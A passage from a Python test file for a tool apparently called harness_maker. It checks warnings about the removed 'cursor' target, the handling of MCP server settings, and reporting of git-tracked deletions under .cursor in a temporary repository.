    assert report.deleted == []


def test_cursor_removed_warning_names_the_mcp_destination_only_when_relevant() -> None:
    plain = cr.removed_warning(["claude-code", "codex"])
    assert "cursor target removed" in plain
    assert "mcp" not in plain.lower()
    with_mcp = cr.removed_warning(["claude-code", "codex"], had_cursor_mcp=True)
    assert with_mcp.startswith(plain)
    assert "MCP servers from harness.yaml now render only to .codex/config.toml" in with_mcp
    assert "\n" not in with_mcp


def test_typing_cursor_at_the_targets_prompt_says_it_was_removed(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    from harness_maker import interview
    from harness_maker.models import Target

    monkeypatch.setattr("builtins.input", lambda _p: "cursor, codex")
    with caplog.at_level(logging.WARNING, logger=interview.logger.name):
        assert interview._ask_targets() == [Target.CODEX]
    messages = [r.getMessage() for r in caplog.records]
    assert any("cursor target removed" in m for m in messages), messages
    assert not any("unknown target" in m for m in messages), messages


def test_tracked_cursor_deletions_are_reported(tmp_path: Path) -> None:
    def git(*args: str) -> None:
        subprocess.run(["git", *args], cwd=tmp_path, check=True, capture_output=True, timeout=30)

    git("init", "-q")
    (tmp_path / ".cursor/rules").mkdir(parents=True)
    (tmp_path / ".cursor/rules/harness.mdc").write_text("x", encoding="utf-8")
    (tmp_path / "keep.txt").write_text("x", encoding="utf-8")
    git("add", ".")
    git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init")
    assert tracked_cursor_deletions(tmp_path) == []
    (tmp_path / ".cursor/rules/harness.mdc").unlink()
    (tmp_path / "keep.txt").unlink()
    assert tracked_cursor_deletions(tmp_path) == [".cursor/rules/harness.mdc"]
    no_repo = tmp_path.parent / f"{tmp_path.name}-no-repo"
    no_repo.mkdir()
    assert tracked_cursor_deletions(no_repo) == []
